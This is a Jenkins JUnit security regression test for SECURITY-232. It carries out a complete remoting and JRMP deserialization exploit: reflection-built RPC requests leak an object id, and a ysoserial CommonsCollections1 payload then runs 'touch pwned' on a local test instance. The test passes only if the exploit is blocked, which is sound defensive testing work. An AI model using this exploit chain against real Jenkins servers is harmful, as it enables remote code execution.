package jenkins.security;

import hudson.remoting.Callable;
import hudson.remoting.Channel;
import hudson.remoting.Channel.Mode;
import hudson.remoting.ChannelBuilder;
import hudson.remoting.ClassFilter;
import hudson.remoting.JarLoader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.activation.ActivationDesc;
import java.rmi.activation.ActivationID;
import java.rmi.activation.ActivationInstantiator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UnicastRemoteObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.SocketFactory;
import static jenkins.security.security218.Payload.CommonsCollections1;
import jenkins.security.security218.ysoserial.payloads.CommonsCollections1;
import jenkins.security.security218.ysoserial.payloads.ObjectPayload;
import static org.junit.Assert.*;
import org.junit.Rule;
import org.junit.Test;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;
import sun.reflect.ReflectionFactory;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastRef2;
import sun.rmi.server.Util;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.TransportConstants;
import sun.rmi.transport.tcp.TCPEndpoint;

/**
 * @author mbechler, adapted for JUnit/JenkinsRule by jglick
 */
@Issue("SECURITY-232")
public class Security232Test {

    @Rule
    public JenkinsRule r = new JenkinsRule();

    @Test
    public void commonsCollections1() throws Exception {
        File pwned = new File(r.jenkins.getRootDir(), "pwned");

        int jrmpPort = 12345;
        URL u = r.getURL();

        HttpURLConnection hc = (HttpURLConnection) u.openConnection();
        int clip = Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port"));

        InetSocketAddress isa = new InetSocketAddress(u.getHost(), clip);
        Socket s = null;
        Channel c = null;
        try {
            System.err.println("* Opening socket " + isa);
            s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            System.err.println("* Opening channel");
            OutputStream outputStream = s.getOutputStream();

            DataOutputStream dos = new DataOutputStream(outputStream);

            dos.writeUTF("Protocol:CLI-connect");

            ExecutorService cp = Executors.newCachedThreadPool();
            c = new ChannelBuilder("EXPLOIT", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);

            System.err.println("* Channel open");

            Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");

            Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
            reqCons.setAccessible(true);

            Object getJarLoader = reqCons
                    .newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[] {
                        JarLoader.class.getName() + ".ours"
            });

            Object call = c.call((Callable<Object,Exception>) getJarLoader);
            InvocationHandler remote = Proxy.getInvocationHandler(call);
            Class<?> rih = Class.forName("hudson.remoting.RemoteInvocationHandler");
            Field oidF = rih.getDeclaredField("oid");
            oidF.setAccessible(true);
            int oid = oidF.getInt(remote);

            System.err.println("* JarLoader oid is " + oid);

            Constructor<UnicastRemoteObject> uroC = UnicastRemoteObject.class.getDeclaredConstructor();
            uroC.setAccessible(true);
            ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
            Constructor<?> sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);
            sc.setAccessible(true);
            UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance();

            Field portF = UnicastRemoteObject.class.getDeclaredField("port");
            portF.setAccessible(true);
            portF.set(uro, jrmpPort);
            Field f = RemoteObject.class.getDeclaredField("ref");
            f.setAccessible(true);
            f.set(uro, new UnicastRef2(new LiveRef(new ObjID(2), new TCPEndpoint("localhost", 12345), true)));

            Object o = reqCons
                    .newInstance(oid, JarLoader.class.getMethod("isPresentOnRemote", Class.forName("hudson.remoting.Checksum")), new Object[] {
                        uro,
            });

            try {
                c.call((Callable<Object,Exception>) o);
            }
            catch ( Exception e ) {
                // [ActivationGroupImpl[UnicastServerRef [liveRef:
                // [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1, -9046794842107247609]]

                e.printStackTrace();

                String msg = e.getMessage();
                int start = msg.indexOf("objID:[");
                if ( start < 0 ) {
                    return; // good, got blocked before we even got this far
                }

                int sep = msg.indexOf(", ", start + 1);

                if ( sep < 0 ) {
                    throw new Exception("Failed to get object id, separator");
                }

                int end = msg.indexOf("]", sep + 1);

                if ( end < 0 ) {
                    throw new Exception("Failed to get object id, separator");
                }

                String uid = msg.substring(start + 7, sep);
                String objNum = msg.substring(sep + 2, end);

                System.err.println("* UID is " + uid);
                System.err.println("* ObjNum is " + objNum);

                String[] parts = uid.split(":");

                long obj = Long.parseLong(objNum);
                int o1 = Integer.parseInt(parts[ 0 ], 16);
                long o2 = Long.parseLong(parts[ 1 ], 16);
                short o3 = Short.parseShort(parts[ 2 ], 16);

                exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, new CommonsCollections1(), "touch " + pwned);
            }

            c.close();
        }
        finally {
            if ( s != null ) {
                s.close();
            }
        }

        Thread.sleep(5000);

        assertFalse("Pwned!", pwned.exists());
    }


    /**
     * @param inetSocketAddress
     * @param obj
     * @param o1
     * @param o2
     * @param o3
     * @throws IOException
     */
    private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2, short o3, ObjectPayload payload, String payloadArg )
            throws Exception {
        Socket s = null;
        try {
            System.err.println("* Opening JRMP socket " + isa);
            s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new ObjectOutputStream(dos) {

                protected void annotateClass ( Class<?> cl ) throws IOException {
                    if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                        writeObject(null);
                    }
                    else {
                        URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                        String cb = "";
                        for ( URL u : us ) {
                            cb += u.toString();
                        }
                        writeObject(cb);
                    }
                }


                /**
                 * Serializes a location from which to load the specified class.
                 */
                protected void annotateProxyClass ( Class<?> cl ) throws IOException {
                    annotateClass(cl);
                }
            };

            objOut.writeLong(obj);
            objOut.writeInt(o1);
            objOut.writeLong(o2);
            objOut.writeShort(o3);

            objOut.writeInt(-1);
            objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod("newInstance", ActivationID.class, ActivationDesc.class)));

            System.err.println("Running " + payload + " against " + ClassFilter.class.getProtectionDomain().getCodeSource().getLocation());
            final Object object = payload.getObject(payloadArg);
            objOut.writeObject(object);

            os.flush();
        }
        finally {
            if ( s != null ) {
                s.close();
            }
        }
    }

}
